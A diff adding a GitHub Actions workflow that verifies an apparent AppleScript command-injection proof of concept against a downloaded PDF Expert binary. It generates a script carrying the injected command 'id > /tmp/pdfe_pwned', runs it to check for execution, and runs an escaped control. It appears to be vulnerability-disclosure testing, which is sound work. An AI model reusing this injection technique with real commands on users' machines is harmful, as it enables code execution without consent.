@@ -1,0 +1,59 @@
+name: pdfexpert-verify2
+
+on:
+  workflow_dispatch:
+
+jobs:
+  v:
+    runs-on: macos-latest
+    timeout-minutes: 15
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Regenerate from the shipped binary
+        run: |
+          set -euo pipefail
+          curl -fsSL -o pex.zip https://downloads.pdfexpert.com/pem3/versions/1187/PDFExpert.zip
+          unzip -q pex.zip -d app
+          python3 poc/gen_poc.py --binary "app/PDF Expert.app/Contents/MacOS/PDF Expert" --cmd "id > /tmp/pdfe_pwned" --field body > generated.scpt
+          grep -n 'new outgoing message' generated.scpt
+
+      - name: A2 - generated content expression in a bare record, correct marker path
+        run: |
+          set +e
+          rm -f /tmp/pdfe_pwned
+          python3 - <<'PY'
+          gen = open('generated.scpt').read()
+          line = [l for l in gen.splitlines() if 'new outgoing message' in l][0]
+          expr = line.split('properties {', 1)[1].rstrip('}')
+          open('nomail.scpt', 'w').write('set r to {' + expr + '}\nreturn content of r\n')
+          print('NOMAIL LINE:', open('nomail.scpt').read().splitlines()[0])
+          PY
+          osacompile -o /tmp/nm.scptd nomail.scpt && echo "NOMAIL COMPILE OK" || echo "NOMAIL COMPILE FAILED"
+          START=$(date +%s)
+          osascript nomail.scpt > nm.out 2>&1
+          echo "NOMAIL RC: $?  ELAPSED: $(( $(date +%s) - START ))s"
+          echo "NOMAIL OUT: [$(cat nm.out)]"
+          if [ -s /tmp/pdfe_pwned ]; then
+            echo "NOMAIL PROOF: do shell script executed"
+            echo "NOMAIL MARKER: [$(cat /tmp/pdfe_pwned)]"
+          else
+            echo "NOMAIL PROOF: none"
+          fi
+
+      - name: A3 - control, same record, quote escaped, must not execute
+        run: |
+          set +e
+          rm -f /tmp/pdfe_ctl2
+          python3 - <<'PY'
+          gen = open('generated.scpt').read()
+          line = [l for l in gen.splitlines() if 'new outgoing message' in l][0]
+          expr = line.split('properties {', 1)[1].rstrip('}')
+          esc = expr.replace('content:"', 'content:"\\"').replace('& linefeed', '\\" & linefeed')
+          esc = esc.replace('/tmp/pdfe_pwned', '/tmp/pdfe_ctl2')
+          open('ctl2.scpt', 'w').write('set r to {' + esc + '}\nreturn content of r\n')
+          print('CTL2 LINE:', open('ctl2.scpt').read().splitlines()[0])
+          PY
+          osacompile -o /tmp/ct.scptd ctl2.scpt && echo "CTL2 COMPILE OK" || echo "CTL2 COMPILE FAILED"
+          echo "CTL2 OUT: [$(osascript ctl2.scpt 2>&1)]"
+          if [ -s /tmp/pdfe_ctl2 ]; then echo "CTL2: FAILED (escaped payload executed)"; else echo "CTL2: OK (escaped payload did not execute)"; fi
